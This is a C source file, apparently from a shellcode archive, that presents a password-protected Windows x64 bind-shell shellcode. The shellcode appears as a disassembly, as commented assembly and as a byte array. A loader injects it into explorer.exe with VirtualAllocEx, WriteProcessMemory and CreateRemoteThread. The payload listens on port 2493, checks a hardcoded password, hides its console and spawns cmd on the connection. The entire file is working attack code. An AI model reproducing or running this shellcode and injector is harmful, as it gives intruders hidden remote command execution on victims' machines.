/*

	# Title : Windows x64 Password Protected Bind Shell TCP shellcode
	# size : 825 bytes
	# Author : Roziul Hasan Khan Shifat
	# Tested On : Windows 7 x64 professional
	# Date : 01-01-2017

*/



/*


   file format pe-x86-64


Disassembly of section .text:

0000000000000000 <_start>:
   0:	99                   	cltd
   1:	b2 80                	mov    $0x80,%dl
   3:	48 29 d4             	sub    %rdx,%rsp
   6:	4c 8d 24 24          	lea    (%rsp),%r12
   a:	48 31 d2             	xor    %rdx,%rdx
   d:	65 48 8b 42 60       	mov    %gs:0x60(%rdx),%rax
  12:	48 8b 40 18          	mov    0x18(%rax),%rax
  16:	48 8b 70 10          	mov    0x10(%rax),%rsi
  1a:	48 ad                	lods   %ds:(%rsi),%rax
  1c:	48 8b 30             	mov    (%rax),%rsi
  1f:	48 8b 7e 30          	mov    0x30(%rsi),%rdi
  23:	b2 88                	mov    $0x88,%dl
  25:	8b 5f 3c             	mov    0x3c(%rdi),%ebx
  28:	48 01 fb             	add    %rdi,%rbx
  2b:	8b 1c 13             	mov    (%rbx,%rdx,1),%ebx
  2e:	48 01 fb             	add    %rdi,%rbx
  31:	8b 73 1c             	mov    0x1c(%rbx),%esi
  34:	48 01 fe             	add    %rdi,%rsi
  37:	48 31 d2             	xor    %rdx,%rdx
  3a:	41 c7 04 24 77 73 32 	movl   $0x5f327377,(%r12)
  41:	5f
  42:	66 41 c7 44 24 04 33 	movw   $0x3233,0x4(%r12)
  49:	32
  4a:	41 88 54 24 06       	mov    %dl,0x6(%r12)
  4f:	66 ba 40 03          	mov    $0x340,%dx
  53:	8b 1c 96             	mov    (%rsi,%rdx,4),%ebx
  56:	48 01 fb             	add    %rdi,%rbx
  59:	49 8d 0c 24          	lea    (%r12),%rcx
  5d:	ff d3                	callq  *%rbx
  5f:	49 89 c7             	mov    %rax,%r15
  62:	48 31 d2             	xor    %rdx,%rdx
  65:	b2 88                	mov    $0x88,%dl
  67:	41 8b 5f 3c          	mov    0x3c(%r15),%ebx
  6b:	4c 01 fb             	add    %r15,%rbx
  6e:	8b 1c 13             	mov    (%rbx,%rdx,1),%ebx
  71:	4c 01 fb             	add    %r15,%rbx
  74:	44 8b 73 1c          	mov    0x1c(%rbx),%r14d
  78:	4d 01 fe             	add    %r15,%r14
  7b:	66 ba c8 01          	mov    $0x1c8,%dx
  7f:	41 8b 1c 16          	mov    (%r14,%rdx,1),%ebx
  83:	4c 01 fb             	add    %r15,%rbx
  86:	48 31 c9             	xor    %rcx,%rcx
  89:	66 b9 98 01          	mov    $0x198,%cx
  8d:	48 29 cc             	sub    %rcx,%rsp
  90:	48 8d 14 24          	lea    (%rsp),%rdx
  94:	66 b9 02 02          	mov    $0x202,%cx
  98:	ff d3                	callq  *%rbx
  9a:	48 83 ec 58          	sub    $0x58,%rsp
  9e:	48 83 ec 58          	sub    $0x58,%rsp
  a2:	48 31 d2             	xor    %rdx,%rdx
  a5:	66 ba 88 01          	mov    $0x188,%dx
  a9:	41 8b 1c 16          	mov    (%r14,%rdx,1),%ebx
  ad:	4c 01 fb             	add    %r15,%rbx
  b0:	6a 06                	pushq  $0x6
  b2:	6a 01                	pushq  $0x1
  b4:	6a 02                	pushq  $0x2
  b6:	59                   	pop    %rcx
  b7:	5a                   	pop    %rdx
  b8:	41 58                	pop    %r8
  ba:	4d 31 c9             	xor    %r9,%r9
  bd:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
  c2:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
  c7:	ff d3                	callq  *%rbx
  c9:	49 89 c5             	mov    %rax,%r13
  cc:	41 8b 5e 04          	mov    0x4(%r14),%ebx
  d0:	4c 01 fb             	add    %r15,%rbx
  d3:	6a 10                	pushq  $0x10
  d5:	41 58                	pop    %r8
  d7:	48 31 d2             	xor    %rdx,%rdx
  da:	49 89 14 24          	mov    %rdx,(%r12)
  de:	49 89 54 24 08       	mov    %rdx,0x8(%r12)
  e3:	41 c6 04 24 02       	movb   $0x2,(%r12)
  e8:	66 41 c7 44 24 02 09 	movw   $0xbd09,0x2(%r12)
  ef:	bd
  f0:	49 8d 14 24          	lea    (%r12),%rdx
  f4:	4c 89 e9             	mov    %r13,%rcx
  f7:	ff d3                	callq  *%rbx
  f9:	41 8b 5e 30          	mov    0x30(%r14),%ebx
  fd:	4c 01 fb             	add    %r15,%rbx
 100:	6a 01                	pushq  $0x1
 102:	5a                   	pop    %rdx
 103:	4c 89 e9             	mov    %r13,%rcx
 106:	ff d3                	callq  *%rbx
 108:	48 83 ec 58          	sub    $0x58,%rsp
 10c:	eb 12                	jmp    120 <a>

000000000000010e <kick>:
 10e:	48 83 c4 58          	add    $0x58,%rsp
 112:	41 8b 5e 08          	mov    0x8(%r14),%ebx
 116:	4c 01 fb             	add    %r15,%rbx
 119:	49 8b 4c 24 f8       	mov    -0x8(%r12),%rcx
 11e:	ff d3                	callq  *%rbx

0000000000000120 <a>:
 120:	41 8b 1e             	mov    (%r14),%ebx
 123:	4c 01 fb             	add    %r15,%rbx
 126:	48 31 d2             	xor    %rdx,%rdx
 129:	49 89 14 24          	mov    %rdx,(%r12)
 12d:	49 89 54 24 08       	mov    %rdx,0x8(%r12)
 132:	b2 10                	mov    $0x10,%dl
 134:	52                   	push   %rdx
 135:	4c 8d 04 24          	lea    (%rsp),%r8
 139:	49 8d 14 24          	lea    (%r12),%rdx
 13d:	4c 89 e9             	mov    %r13,%rcx
 140:	ff d3                	callq  *%rbx
 142:	49 89 44 24 f8       	mov    %rax,-0x8(%r12)
 147:	41 8b 5e 48          	mov    0x48(%r14),%ebx
 14b:	4c 01 fb             	add    %r15,%rbx
 14e:	49 8b 4c 24 f8       	mov    -0x8(%r12),%rcx
 153:	41 c7 04 24 2d 2d 3e 	movl   $0x203e2d2d,(%r12)
 15a:	20
 15b:	49 8d 14 24          	lea    (%r12),%rdx
 15f:	6a 04                	pushq  $0x4
 161:	41 58                	pop    %r8
 163:	4d 31 c9             	xor    %r9,%r9
 166:	48 83 ec 58          	sub    $0x58,%rsp
 16a:	ff d3                	callq  *%rbx
 16c:	41 8b 5e 3c          	mov    0x3c(%r14),%ebx
 170:	4c 01 fb             	add    %r15,%rbx
 173:	4d 31 c9             	xor    %r9,%r9
 176:	6a 08                	pushq  $0x8
 178:	41 58                	pop    %r8
 17a:	49 8d 14 24          	lea    (%r12),%rdx
 17e:	49 8b 4c 24 f8       	mov    -0x8(%r12),%rcx
 183:	ff d3                	callq  *%rbx
 185:	41 81 3c 24 68 32 37 	cmpl   $0x31373268,(%r12)
 18c:	31
 18d:	0f 85 7b ff ff ff    	jne    10e <kick>
 193:	41 81 7c 24 04 35 30 	cmpl   $0x46383035,0x4(%r12)
 19a:	38 46
 19c:	0f 85 6c ff ff ff    	jne    10e <kick>
 1a2:	8b 5e 44             	mov    0x44(%rsi),%ebx
 1a5:	48 01 fb             	add    %rdi,%rbx
 1a8:	ff d3                	callq  *%rbx
 1aa:	48 31 d2             	xor    %rdx,%rdx
 1ad:	41 c7 04 24 75 73 65 	movl   $0x72657375,(%r12)
 1b4:	72
 1b5:	66 41 c7 44 24 04 33 	movw   $0x3233,0x4(%r12)
 1bc:	32
 1bd:	41 88 54 24 06       	mov    %dl,0x6(%r12)
 1c2:	49 8d 0c 24          	lea    (%r12),%rcx
 1c6:	48 83 ec 58          	sub    $0x58,%rsp
 1ca:	66 ba 40 03          	mov    $0x340,%dx
 1ce:	8b 1c 96             	mov    (%rsi,%rdx,4),%ebx
 1d1:	48 01 fb             	add    %rdi,%rbx
 1d4:	ff d3                	callq  *%rbx
 1d6:	49 89 c6             	mov    %rax,%r14
 1d9:	41 c7 04 24 46 69 6e 	movl   $0x646e6946,(%r12)
 1e0:	64
 1e1:	41 c7 44 24 04 57 69 	movl   $0x646e6957,0x4(%r12)
 1e8:	6e 64
 1ea:	41 c7 44 24 08 6f 77 	movl   $0x4141776f,0x8(%r12)
 1f1:	41 41
 1f3:	41 80 74 24 0b 41    	xorb   $0x41,0xb(%r12)
 1f9:	48 31 d2             	xor    %rdx,%rdx
 1fc:	66 ba 2c 09          	mov    $0x92c,%dx
 200:	44 8b 2c 16          	mov    (%rsi,%rdx,1),%r13d
 204:	49 01 fd             	add    %rdi,%r13
 207:	49 8d 14 24          	lea    (%r12),%rdx
 20b:	4c 89 f1             	mov    %r14,%rcx
 20e:	41 ff d5             	callq  *%r13
 211:	48 31 d2             	xor    %rdx,%rdx
 214:	41 c7 04 24 43 6f 6e 	movl   $0x736e6f43,(%r12)
 21b:	73
 21c:	41 c7 44 24 04 6f 6c 	movl   $0x57656c6f,0x4(%r12)
 223:	65 57
 225:	41 c7 44 24 08 69 6e 	movl   $0x6f646e69,0x8(%r12)
 22c:	64 6f
 22e:	41 c7 44 24 0c 77 43 	movl   $0x616c4377,0xc(%r12)
 235:	6c 61
 237:	66 41 c7 44 24 10 73 	movw   $0x7373,0x10(%r12)
 23e:	73
 23f:	41 88 54 24 12       	mov    %dl,0x12(%r12)
 244:	49 8d 0c 24          	lea    (%r12),%rcx
 248:	48 83 ec 58          	sub    $0x58,%rsp
 24c:	ff d0                	callq  *%rax
 24e:	48 31 d2             	xor    %rdx,%rdx
 251:	41 c7 04 24 53 68 6f 	movl   $0x776f6853,(%r12)
 258:	77
 259:	41 c7 44 24 04 57 69 	movl   $0x646e6957,0x4(%r12)
 260:	6e 64
 262:	66 41 c7 44 24 08 6f 	movw   $0x776f,0x8(%r12)
 269:	77
 26a:	41 88 54 24 0a       	mov    %dl,0xa(%r12)
 26f:	49 8d 14 24          	lea    (%r12),%rdx
 273:	4c 89 f1             	mov    %r14,%rcx
 276:	41 55                	push   %r13
 278:	5b                   	pop    %rbx
 279:	49 89 c5             	mov    %rax,%r13
 27c:	ff d3                	callq  *%rbx
 27e:	4c 89 e9             	mov    %r13,%rcx
 281:	48 31 d2             	xor    %rdx,%rdx
 284:	ff d0                	callq  *%rax
 286:	4d 31 c0             	xor    %r8,%r8
 289:	41 50                	push   %r8
 28b:	5a                   	pop    %rdx
 28c:	66 ba 1f 04          	mov    $0x41f,%dx
 290:	8b 1c 96             	mov    (%rsi,%rdx,4),%ebx
 293:	48 01 fb             	add    %rdi,%rbx
 296:	41 50                	push   %r8
 298:	5a                   	pop    %rdx
 299:	b2 80                	mov    $0x80,%dl
 29b:	49 8d 0c 24          	lea    (%r12),%rcx
 29f:	ff d3                	callq  *%rbx
 2a1:	48 31 d2             	xor    %rdx,%rdx
 2a4:	41 c7 44 24 f4 63 6d 	movl   $0x41646d63,-0xc(%r12)
 2ab:	64 41
 2ad:	41 88 54 24 f7       	mov    %dl,-0x9(%r12)
 2b2:	b2 68                	mov    $0x68,%dl
 2b4:	49 89 14 24          	mov    %rdx,(%r12)
 2b8:	b2 ff                	mov    $0xff,%dl
 2ba:	48 ff c2             	inc    %rdx
 2bd:	49 8b 44 24 f8       	mov    -0x8(%r12),%rax
 2c2:	41 89 54 24 3c       	mov    %edx,0x3c(%r12)
 2c7:	49 89 44 24 50       	mov    %rax,0x50(%r12)
 2cc:	49 89 44 24 58       	mov    %rax,0x58(%r12)
 2d1:	49 89 44 24 60       	mov    %rax,0x60(%r12)
 2d6:	48 83 ec 58          	sub    $0x58,%rsp
 2da:	48 31 c9             	xor    %rcx,%rcx
 2dd:	4d 31 c9             	xor    %r9,%r9
 2e0:	6a 01                	pushq  $0x1
 2e2:	41 58                	pop    %r8
 2e4:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
 2e9:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
 2ee:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
 2f3:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
 2f8:	49 8d 14 24          	lea    (%r12),%rdx
 2fc:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
 301:	49 8d 54 24 68       	lea    0x68(%r12),%rdx
 306:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
 30b:	4d 31 c0             	xor    %r8,%r8
 30e:	49 8d 54 24 f4       	lea    -0xc(%r12),%rdx
 313:	4d 31 d2             	xor    %r10,%r10
 316:	66 41 ba 94 02       	mov    $0x294,%r10w
 31b:	42 8b 1c 16          	mov    (%rsi,%r10,1),%ebx
 31f:	48 01 fb             	add    %rdi,%rbx
 322:	ff d3                	callq  *%rbx
 324:	48 31 d2             	xor    %rdx,%rdx
 327:	52                   	push   %rdx
 328:	66 ba 29 01          	mov    $0x129,%dx
 32c:	8b 1c 96             	mov    (%rsi,%rdx,4),%ebx
 32f:	48 01 fb             	add    %rdi,%rbx
 332:	59                   	pop    %rcx
 333:	48 83 c4 58          	add    $0x58,%rsp
 337:	ff d3                	callq  *%rbx








*/






/*

section .text
	global _start
_start:


cdq
mov dl, 128

sub rsp,rdx
lea r12,[rsp]



xor rdx,rdx

mov rax,[gs:rdx+0x60]
mov rax,[rax+0x18]
mov rsi,[rax+0x10]
lodsq
mov rsi,[rax]
mov rdi,[rsi+0x30] ;kernel32.dll base address


;-----------------------------------------

mov dl,0x88
mov ebx,[rdi+0x3c]
add rbx,rdi
mov ebx,[rbx+rdx]
add rbx,rdi


mov esi,[rbx+0x1c] ;kernel32.dll AddressOfFunctions
add rsi,rdi


;=============================================MAIN CODE====================================================;



;loading ws2_32.dll

xor rdx,rdx




mov [r12],dword 'ws2_'
mov [r12+4],word '32'
mov [r12+6],byte dl

mov dx,832
mov ebx,[rsi+rdx*4]
add rbx,rdi

lea rcx,[r12]
call rbx

mov r15,rax ;ws2_32.dll base Address
;---------------------------
xor rdx,rdx
mov dl,0x88
mov ebx,[r15+0x3c]
add rbx,r15
mov ebx,[rbx+rdx]
add rbx,r15

mov r14d,[rbx+0x1c]
add r14,r15 ;ws2_32.dll AddressOfFunctions

;---------------------------------------------
;WSAStartup(514,&WSADATA)



mov dx,114*4
mov ebx,[r14+rdx]
add rbx,r15

xor rcx,rcx
mov cx,408

sub rsp,rcx
lea rdx,[rsp]
mov cx,514



call rbx

;---------------------------------------------
;WSASocketA(2,1,6,0,0,0)
sub rsp,88
sub rsp,88
xor rdx,rdx
mov dx,98*4
mov ebx,[r14+rdx]
add rbx,r15

push 6
push 1
push 2

pop rcx
pop rdx
pop r8

xor r9,r9

mov [rsp+32],r9
mov [rsp+40],r9

call rbx

mov r13,rax ;SOCKET
;----------------------------------------------------------------
;--------------------------------------------------
mov ebx,[r14+4]
add rbx,r15 ;bind()

;bind(SOCKET,(struct sockaddr *)&struct sockaddr_in,16)


push 16
pop r8

xor rdx,rdx

mov [r12],rdx
mov [r12+8],rdx

mov [r12],byte 2
mov [r12+2],word 0xbd09 ;port 2493 (change it if U want)
lea rdx,[r12]

mov rcx,r13

call rbx

;---------------------------------------------------------
mov ebx,[r14+48]
add rbx,r15 ;listen()

;listen(SOCKET,1)

push 1
pop rdx

mov rcx,r13
call rbx

sub rsp,88

jmp a
;------------------------------------------------
;-----------------------------------------
kick:
add rsp,88

mov ebx,[r14+8]
add rbx,r15 ;CloseSocket()

mov rcx,[r12-8]

call rbx





;-----------------------------------
a:



mov ebx,[r14]
add rbx,r15 ;accept()

;accept(SOCKET,(struct sockaddr *)&struct sockaddr_in,16)

xor rdx,rdx

mov [r12],rdx
mov [r12+8],rdx

mov dl,16
push rdx

lea r8,[rsp]


lea rdx,[r12]

mov rcx,r13


call rbx

mov [r12-8],rax ;client socket
;--------------------------
;send(SOCKET,string,4,0)
mov ebx,[r14+72]
add rbx,r15 ;send()


mov rcx,[r12-8]
mov [r12],dword 0x203e2d2d
lea rdx,[r12]

push byte 4
pop r8

xor r9,r9
sub rsp,88
call rbx

;-------------------------------------------

mov ebx,[r14+60]
add rbx,r15 ;recv()

xor r9,r9
push byte 8
pop r8
lea rdx,[r12]
mov rcx,[r12-8]
call rbx

;------------------------
;password: h271508F

cmp dword [r12],'h271'
jne kick
cmp dword [r12+4],'508F'
jne kick



;----------------------------------------------
;hiding window

mov ebx,[rsi+68]
add rbx,rdi

call rbx ;AllocConsole()

;---------------------------------------
xor rdx,rdx

;loading user32.dll
mov [r12],dword 'user'
mov [r12+4],word '32'
mov [r12+6],byte dl

lea rcx,[r12]

sub rsp,88 ;reserving memory for API

mov dx,832
mov ebx,[rsi+rdx*4]
add rbx,rdi

call rbx ;LoadLibraryA("user32")

mov r14,rax ;user32.dll base

;----------------------------------------------------------------
;--------------------------------------
;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
;Finding address of FindWindowA()
mov [r12],dword 'Find'
mov [r12+4],dword 'Wind'
mov [r12+8],dword 'owAA'
xor byte [r12+11],0x41

xor rdx,rdx
mov dx,587*4
mov r13d,[rsi+rdx]
add r13,rdi ;GetProcAddress() (temporary)


lea rdx,[r12]
mov rcx,r14

call r13

;--------------------------------------
;-------------------------------------------------

;FindWindowA("ConsoleWindowClass",NULL)
xor rdx,rdx

mov [r12],dword 'Cons'
mov [r12+4],dword 'oleW'
mov [r12+8],dword 'indo'
mov [r12+12],dword 'wCla'
mov [r12+16],word 'ss'
mov [r12+18],byte dl

lea rcx,[r12]
sub rsp,88
call rax

;----------------------------------
;===========================================================

xor rdx,rdx

;finding Address of ShowWindow()
mov [r12],dword 'Show'
mov [r12+4],dword 'Wind'
mov [r12+8],word 'ow'
mov [r12+10],byte dl

lea rdx,[r12]
mov rcx,r14

push r13
pop rbx

mov r13,rax ;HWND

call rbx

;-------------------------------------
mov rcx,r13
xor rdx,rdx

call rax
;----------------------------









;--------------------------------------
;RtlFillMemory(address,length,fill)
xor r8,r8
push r8
pop rdx

mov dx,1055
mov ebx,[rsi+rdx*4]
add rbx,rdi

push r8
pop rdx

mov dl,128

lea rcx,[r12]

call rbx
;----------------------------------------------------------





















;----------------------------------------------------------------

xor rdx,rdx

mov [r12-12],dword 'cmdA'
mov [r12-9],byte dl


mov dl,104

mov [r12],rdx
mov dl,255
inc rdx


mov rax,[r12-8]

mov [r12+0x3c],edx

mov [r12+0x50],rax
mov [r12+0x58],rax
mov [r12+0x60],rax

;---------------------------------------------------
;CreateProcessA(NULL,"cmd",NULL,NULL,TRUE,0,NULL,NULL,&STARTUPINFOA,&PROCESS_INFOMATION)

sub rsp,88

xor rcx,rcx
xor r9,r9


push 1
pop r8

mov [rsp+32],r8
mov [rsp+40],rcx
mov [rsp+48],rcx
mov [rsp+56],rcx

lea rdx,[r12]
mov [rsp+64],rdx
lea rdx,[r12+104]
mov [rsp+72],rdx




xor r8,r8
lea rdx,[r12-12]

xor r10,r10
mov r10w,165*4
mov ebx,[rsi+r10]
add rbx,rdi ;CreateProcessA()

call rbx




;------------------------------------------------------


;------------------------------










xor rdx,rdx
push rdx

mov dx,297
mov ebx,[rsi+rdx*4]
add rbx,rdi

pop rcx
add rsp,88
call rbx







*/























#include<windows.h>
#include<stdio.h>
#include<string.h>
#include<tlhelp32.h>

char shellcode[]=\

"\x99\xb2\x80\x48\x29\xd4\x4c\x8d\x24\x24\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x40\x18\x48\x8b\x70\x10\x48\xad\x48\x8b\x30\x48\x8b\x7e\x30\xb2\x88\x8b\x5f\x3c\x48\x01\xfb\x8b\x1c\x13\x48\x01\xfb\x8b\x73\x1c\x48\x01\xfe\x48\x31\xd2\x41\xc7\x04\x24\x77\x73\x32\x5f\x66\x41\xc7\x44\x24\x04\x33\x32\x41\x88\x54\x24\x06\x66\xba\x40\x03\x8b\x1c\x96\x48\x01\xfb\x49\x8d\x0c\x24\xff\xd3\x49\x89\xc7\x48\x31\xd2\xb2\x88\x41\x8b\x5f\x3c\x4c\x01\xfb\x8b\x1c\x13\x4c\x01\xfb\x44\x8b\x73\x1c\x4d\x01\xfe\x66\xba\xc8\x01\x41\x8b\x1c\x16\x4c\x01\xfb\x48\x31\xc9\x66\xb9\x98\x01\x48\x29\xcc\x48\x8d\x14\x24\x66\xb9\x02\x02\xff\xd3\x48\x83\xec\x58\x48\x83\xec\x58\x48\x31\xd2\x66\xba\x88\x01\x41\x8b\x1c\x16\x4c\x01\xfb\x6a\x06\x6a\x01\x6a\x02\x59\x5a\x41\x58\x4d\x31\xc9\x4c\x89\x4c\x24\x20\x4c\x89\x4c\x24\x28\xff\xd3\x49\x89\xc5\x41\x8b\x5e\x04\x4c\x01\xfb\x6a\x10\x41\x58\x48\x31\xd2\x49\x89\x14\x24\x49\x89\x54\x24\x08\x41\xc6\x04\x24\x02\x66\x41\xc7\x44\x24\x02\x09\xbd\x49\x8d\x14\x24\x4c\x89\xe9\xff\xd3\x41\x8b\x5e\x30\x4c\x01\xfb\x6a\x01\x5a\x4c\x89\xe9\xff\xd3\x48\x83\xec\x58\xeb\x12\x48\x83\xc4\x58\x41\x8b\x5e\x08\x4c\x01\xfb\x49\x8b\x4c\x24\xf8\xff\xd3\x41\x8b\x1e\x4c\x01\xfb\x48\x31\xd2\x49\x89\x14\x24\x49\x89\x54\x24\x08\xb2\x10\x52\x4c\x8d\x04\x24\x49\x8d\x14\x24\x4c\x89\xe9\xff\xd3\x49\x89\x44\x24\xf8\x41\x8b\x5e\x48\x4c\x01\xfb\x49\x8b\x4c\x24\xf8\x41\xc7\x04\x24\x2d\x2d\x3e\x20\x49\x8d\x14\x24\x6a\x04\x41\x58\x4d\x31\xc9\x48\x83\xec\x58\xff\xd3\x41\x8b\x5e\x3c\x4c\x01\xfb\x4d\x31\xc9\x6a\x08\x41\x58\x49\x8d\x14\x24\x49\x8b\x4c\x24\xf8\xff\xd3\x41\x81\x3c\x24\x68\x32\x37\x31\x0f\x85\x7b\xff\xff\xff\x41\x81\x7c\x24\x04\x35\x30\x38\x46\x0f\x85\x6c\xff\xff\xff\x8b\x5e\x44\x48\x01\xfb\xff\xd3\x48\x31\xd2\x41\xc7\x04\x24\x75\x73\x65\x72\x66\x41\xc7\x44\x24\x04\x33\x32\x41\x88\x54\x24\x06\x49\x8d\x0c\x24\x48\x83\xec\x58\x66\xba\x40\x03\x8b\x1c\x96\x48\x01\xfb\xff\xd3\x49\x89\xc6\x41\xc7\x04\x24\x46\x69\x6e\x64\x41\xc7\x44\x24\x04\x57\x69\x6e\x64\x41\xc7\x44\x24\x08\x6f\x77\x41\x41\x41\x80\x74\x24\x0b\x41\x48\x31\xd2\x66\xba\x2c\x09\x44\x8b\x2c\x16\x49\x01\xfd\x49\x8d\x14\x24\x4c\x89\xf1\x41\xff\xd5\x48\x31\xd2\x41\xc7\x04\x24\x43\x6f\x6e\x73\x41\xc7\x44\x24\x04\x6f\x6c\x65\x57\x41\xc7\x44\x24\x08\x69\x6e\x64\x6f\x41\xc7\x44\x24\x0c\x77\x43\x6c\x61\x66\x41\xc7\x44\x24\x10\x73\x73\x41\x88\x54\x24\x12\x49\x8d\x0c\x24\x48\x83\xec\x58\xff\xd0\x48\x31\xd2\x41\xc7\x04\x24\x53\x68\x6f\x77\x41\xc7\x44\x24\x04\x57\x69\x6e\x64\x66\x41\xc7\x44\x24\x08\x6f\x77\x41\x88\x54\x24\x0a\x49\x8d\x14\x24\x4c\x89\xf1\x41\x55\x5b\x49\x89\xc5\xff\xd3\x4c\x89\xe9\x48\x31\xd2\xff\xd0\x4d\x31\xc0\x41\x50\x5a\x66\xba\x1f\x04\x8b\x1c\x96\x48\x01\xfb\x41\x50\x5a\xb2\x80\x49\x8d\x0c\x24\xff\xd3\x48\x31\xd2\x41\xc7\x44\x24\xf4\x63\x6d\x64\x41\x41\x88\x54\x24\xf7\xb2\x68\x49\x89\x14\x24\xb2\xff\x48\xff\xc2\x49\x8b\x44\x24\xf8\x41\x89\x54\x24\x3c\x49\x89\x44\x24\x50\x49\x89\x44\x24\x58\x49\x89\x44\x24\x60\x48\x83\xec\x58\x48\x31\xc9\x4d\x31\xc9\x6a\x01\x41\x58\x4c\x89\x44\x24\x20\x48\x89\x4c\x24\x28\x48\x89\x4c\x24\x30\x48\x89\x4c\x24\x38\x49\x8d\x14\x24\x48\x89\x54\x24\x40\x49\x8d\x54\x24\x68\x48\x89\x54\x24\x48\x4d\x31\xc0\x49\x8d\x54\x24\xf4\x4d\x31\xd2\x66\x41\xba\x94\x02\x42\x8b\x1c\x16\x48\x01\xfb\xff\xd3\x48\x31\xd2\x52\x66\xba\x29\x01\x8b\x1c\x96\x48\x01\xfb\x59\x48\x83\xc4\x58\xff\xd3";


int main()
{
	HANDLE s,proc;
	PROCESSENTRY32 ps;
	BOOL process_found=0;
	LPVOID shell;
	SIZE_T total;

	//finding explorer.exe pid

	ps.dwSize=sizeof(ps);

	s=CreateToolhelp32Snapshot(2,0);

	if(s==INVALID_HANDLE_VALUE)
	{
		printf("CreateToolhelp32Snapshot() failed.Error code %d\n",GetLastError());
		return -1;
	}

	if(!Process32First(s,&ps))
	{
		printf("Process32First() failed.Error code %d\n",GetLastError());
		return -1;
	}


	do{
		if(0==strcmp(ps.szExeFile,"explorer.exe"))
		{
			process_found=1;
			break;
		}
	}while(Process32Next(s,&ps));


	if(!process_found)
	{
		printf("Unknown Process\n");
		return -1;
	}


	//opening process using pid


	proc=OpenProcess(PROCESS_ALL_ACCESS,0,ps.th32ProcessID);

	if(proc==INVALID_HANDLE_VALUE)
	{
		printf("OpenProcess() failed.Error code %d\n",GetLastError());
		return -1;
	}


	//allocating memory process memory

	if( (shell=VirtualAllocEx(proc,NULL,sizeof(shellcode),MEM_COMMIT,PAGE_EXECUTE_READWRITE)) == NULL)
	{
		printf("Failed to allocate memory into process");
		CloseHandle(proc);
		return -1;
	}


	//writing shellcode into process memory

	WriteProcessMemory(proc,shell,shellcode,sizeof(shellcode),&total);

	if(sizeof(shellcode)!=total)
	{
		printf("Failed write shellcode into process memory");
		CloseHandle(proc);
		return -1;
	}


	//Executing shellcode

	if((s=CreateRemoteThread(proc,NULL,0,(LPTHREAD_START_ROUTINE)shell,NULL,0,0))==NULL)
	{
		printf("Failed to Execute shellcode");
		CloseHandle(proc);
		return -1;
	}

	CloseHandle(proc);
	CloseHandle(s);

	return 0;


}